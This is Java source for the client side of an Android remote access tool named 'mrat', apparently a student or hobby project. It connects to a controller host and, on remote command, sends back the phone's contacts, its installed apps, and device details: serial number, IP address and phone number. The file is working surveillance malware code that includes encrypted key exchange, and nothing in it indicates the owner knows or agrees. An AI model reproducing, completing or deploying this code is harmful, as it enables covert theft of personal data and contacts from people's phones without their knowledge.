package afernandezb92.mrat;


import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.database.Cursor;
import android.os.StrictMode;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.view.View;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ConnectException;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.sql.Timestamp;
import java.util.Collections;
import java.util.List;
import java.util.Locale;

import afernandezb92.mrat.cipher.CipherAES;
import afernandezb92.mrat.cipher.RSADecryption;
import afernandezb92.mrat.cipher.RSAEncryption;
import afernandezb92.mrat.messages.Mensaje;


/**
 * Created by Alejandro on 26/01/2017.
 */
public class Client extends MainActivity {
    protected static final int TGETCONTACT = 1;
    protected static final int RGETCONTACT = 2;
    protected static final int TGETSCREENSHOT = 3;
    protected static final int TGETINSTALLEDAPPS = 4;
    protected static final int RGETINSTALLEDAPPS = 5;
    protected static final int TGETINFO = 6;
    protected static final int RGETINFO = 7;
    protected static final int TSENDID = 8;
    protected static final int TGETKEY = 9;
    protected static final int RGETKEY = 10;
    protected static final int TSENDKEY = 11;
    protected static final int ROK = 12;
    protected static final int RERR = 13;
    protected static final int CLIENTID = 0;
    View view;
    Socket socket = null;
    InetAddress address;
    OutputStream o;
    InputStream i;
    DataOutputStream outstream = null;
    DataInputStream instream = null;
    Boolean debug = true;
    Context context;
    Timestamp ts;
    CipherAES cipherAes, cipherAesMaster;

    public Client (String hostname, int port, Context context){
        try {
            // Sin estas dos lineas no se permite crear el socket
            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
            StrictMode.setThreadPolicy(policy);

            address = InetAddress.getByName(hostname);
            socket = new Socket(address, port);
            this.context = context;
            System.out.println("Cliente arrancado");
            sendId();
            run();
        } catch (ConnectException c){
            System.out.println("Connection refusd");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void sendId(){
        Mensaje.TSendId tid = new Mensaje.TSendId(CLIENTID);
        System.out.println(tid.toString());
        try {
            o = socket.getOutputStream();
            tid.writeTo(o);
        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void run() throws IOException{
        try {
            i = socket.getInputStream();
            for(;;){
                Mensaje request = Mensaje.readMsg(i);
                switch(request.getType()){
                    case TGETCONTACT:
                        Mensaje.TGetContact contact = (Mensaje.TGetContact) request;
                        if (debug){
                            System.out.println(contact);
                        }
                        sendContacts(contact);
                        break;
                    case TGETINSTALLEDAPPS:
                        Mensaje.TGetInstalledApps apps = (Mensaje.TGetInstalledApps) request;
                        if (debug){
                            System.out.println(apps);
                        }
                        sendInstalledApps(apps);
                        break;
                    case TGETINFO:
                        Mensaje.TGetInfo info = (Mensaje.TGetInfo) request;
                        if (debug){
                            System.out.println(info);
                        }
                        sendInfo(info);
                        break;
                    case TGETKEY:
                        Mensaje.TGetKey key = (Mensaje.TGetKey) request;
                        if (debug){
                            System.out.println(key);
                        }
                        sendKey(key);
                        break;
                    case TSENDKEY:
                        Mensaje.TSendKey skey = (Mensaje.TSendKey) request;
                        if (debug){
                            System.out.println(skey);
                        }
                        System.out.println("Msg valid: " + skey.isValid());
                        saveKey(skey);
                        break;
                    default:
                        System.out.println("Mensaje desconocido");
                }
            }
        } catch(IOException e){
            System.out.println("Cliente desconectado");
        } catch (Exception e) {
            e.printStackTrace();
        } finally{
            i.close();
            o.close();
        }
    }

    //KEYS
    private void sendKey(Mensaje.TGetKey t){
        String key;
        RSAEncryption rsa = new RSAEncryption();
        key = rsa.encrypt();
        if (key == null) {
            Mensaje.RErr err = new Mensaje.RErr(t, "error with keys");
            try {
                if (debug){
                    System.out.println(err);
                }
                o = socket.getOutputStream();
                err.writeTo(o);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            Mensaje.RGetKey mKey = new Mensaje.RGetKey(t, key);
            try {
                if (debug){
                    System.out.println(mKey);
                }
                o = socket.getOutputStream();
                mKey.writeTo(o);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private void saveKey(Mensaje.TSendKey t){
        if(t.isValid()){
            cipherAesMaster = new CipherAES(t.getKeyMaster());
            Mensaje.ROk rOk = new Mensaje.ROk(t, t.getNonce()+1, t.getTimestamp(), cipherAesMaster);
            try {
                if (debug){
                    System.out.println(rOk);
                }
                o = socket.getOutputStream();
                rOk.writeTo(o);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else{
            Mensaje.RErr err = new Mensaje.RErr(t,"TSendKey Message is not valid");
            try {
                if (debug){
                    System.out.println(err);
                }
                o = socket.getOutputStream();
                err.writeTo(o);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    //CONTACTS
    private void sendContacts (Mensaje.TGetContact t){
        String[] names;
        String[] numbers;
        int numContacts = 0;
        numContacts = getNumContacts();
        if (numContacts == 0) {
            Mensaje.RErr err = new Mensaje.RErr(t,"not found contacts in phone");
            try {
                if (debug){
                    System.out.println(err);
                }
                o = socket.getOutputStream();
                err.writeTo(o);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            names = new String[numContacts];
            numbers = new String[numContacts];
            getContacts(names, numbers);
            Mensaje.RGetContact contacts = new Mensaje.RGetContact(t, names, numbers);
            try {
                if (debug){
                    System.out.println(contacts);
                }
                o = socket.getOutputStream();
                contacts.writeTo(o);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private int getNumContacts () {
        int i = 0;
        String[] projeccion = new String[] { ContactsContract.Data._ID, ContactsContract.Data.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER, ContactsContract.CommonDataKinds.Phone.TYPE };
        String selectionClause = ContactsContract.Data.MIMETYPE + "='" +
                ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE + "' AND "
                + ContactsContract.CommonDataKinds.Phone.NUMBER + " IS NOT NULL";
        String sortOrder = ContactsContract.Data.DISPLAY_NAME + " ASC";
        Cursor c = context.getContentResolver().query(
                ContactsContract.Data.CONTENT_URI,
                projeccion,
                selectionClause,
                null,
                sortOrder);
        while(c.moveToNext()){
            i++;
        }
        c.close();
        return i;
    }

    private boolean getContacts(String[] names, String[] numbers ){
        boolean isEmpty = true;
        int i = 0;
        String[] projeccion = new String[] { ContactsContract.Data._ID, ContactsContract.Data.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER, ContactsContract.CommonDataKinds.Phone.TYPE };
        String selectionClause = ContactsContract.Data.MIMETYPE + "='" +
                ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE + "' AND "
                + ContactsContract.CommonDataKinds.Phone.NUMBER + " IS NOT NULL";
        String sortOrder = ContactsContract.Data.DISPLAY_NAME + " ASC";
        Cursor c = context.getContentResolver().query(
                ContactsContract.Data.CONTENT_URI,
                projeccion,
                selectionClause,
                null,
                sortOrder);
        while(c.moveToNext()){
            isEmpty = false;
            //System.out.println("Nombre: " + c.getString(1) + " Número: " + c.getString(2));
            names[i] = c.getString(1);
            numbers[i] = c.getString(2);
            i++;
        }
        c.close();
        return isEmpty;
    }

    // INSTALLED APPS
    private void sendInstalledApps (Mensaje.TGetInstalledApps t){
        String[] appsNames = getInstalledApps();
        if (appsNames.length == 0) {
            Mensaje.RErr err = new Mensaje.RErr(t,"not found apps in phone");
            try {
                if (debug){
                    System.out.println(err);
                }
                o = socket.getOutputStream();
                err.writeTo(o);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            Mensaje.RGetInstalledApps apps = new Mensaje.RGetInstalledApps(t, appsNames);
            try {
                if (debug){
                    System.out.println(apps);
                }
                o = socket.getOutputStream();
                apps.writeTo(o);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private int getNumInstalledApps() {
        int numApps = 0;
        List<PackageInfo> packs = context.getPackageManager().getInstalledPackages(0);
        for (int i = 0; i < packs.size(); i++) {
            PackageInfo p = packs.get(i);
            if ((isSystemPackage(p) == false)) {
                numApps++;
            }
        }
        System.out.println(numApps);
        return numApps;
    }

    private String[] getInstalledApps() {
        int j = 0;
        int numApps = getNumInstalledApps();
        String[] appNames = new String[numApps];
        List<PackageInfo> packs = context.getPackageManager().getInstalledPackages(0);
        for (int i = 0; i < packs.size(); i++) {
            PackageInfo p = packs.get(i);
            if ((isSystemPackage(p) == false)) {
                //Iconos
                //Drawable icon = p.applicationInfo.loadIcon(getPackageManager());
                System.out.println("App: " + p.applicationInfo.loadLabel(context.getPackageManager()).toString());
                appNames[j] = p.applicationInfo.loadLabel(context.getPackageManager()).toString();;
                j++;
            }
        }
        return appNames;
    }

    private boolean isSystemPackage(PackageInfo pkgInfo) {
        return ((pkgInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0) ? true : false;
    }

    // GET INFO
    private void sendInfo (Mensaje.TGetInfo t){
        String info;
        info = getInfo();
        if (info == null) {
            Mensaje.RErr err = new Mensaje.RErr(t,"not info in phone");
            try {
                if (debug){
                    System.out.println(err);
                }
                o = socket.getOutputStream();
                err.writeTo(o);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            Mensaje.RGetInfo mInfo = new Mensaje.RGetInfo(t, info);
            try {
                if (debug){
                    System.out.println(mInfo);
                }
                o = socket.getOutputStream();
                mInfo.writeTo(o);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private String getInfo(){
        TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String mPhoneNumber = tMgr.getLine1Number();
        return "OS VERSION: " + System.getProperty("os.version") + "\nDEVICE: " + android.os.Build.DEVICE
                + "\nMODEL: " + android.os.Build.MODEL + "\nSERIAL: " + android.os.Build.SERIAL
                + "\nUSER: " + android.os.Build.USER + "\nLANGUAGE: " + Locale.getDefault().getDisplayLanguage()
                + "\nCOUNTRY: " + context.getResources().getConfiguration().locale.getCountry()
                + "\nIP: " + getIPAddress(true) + "\nPHONE NUMBER: " + getMyNumber();
    }

    private String getMyNumber(){
        TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        return tMgr.getLine1Number();
    }

    private static String getIPAddress(boolean useIPv4) {
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface intf : interfaces) {
                List<InetAddress> addrs = Collections.list(intf.getInetAddresses());
                for (InetAddress addr : addrs) {
                    if (!addr.isLoopbackAddress()) {
                        String sAddr = addr.getHostAddress().toUpperCase();
                        boolean isIPv4 = addr instanceof Inet4Address;
                        if (useIPv4) {
                            if (isIPv4)
                                return sAddr;
                        } else {
                            if (!isIPv4) {
                                int delim = sAddr.indexOf('%');
                                return delim < 0 ? sAddr : sAddr.substring(0, delim);
                            }
                        }
                    }
                }
            }
        } catch (Exception ex) {
        }
        return null;
    }
}
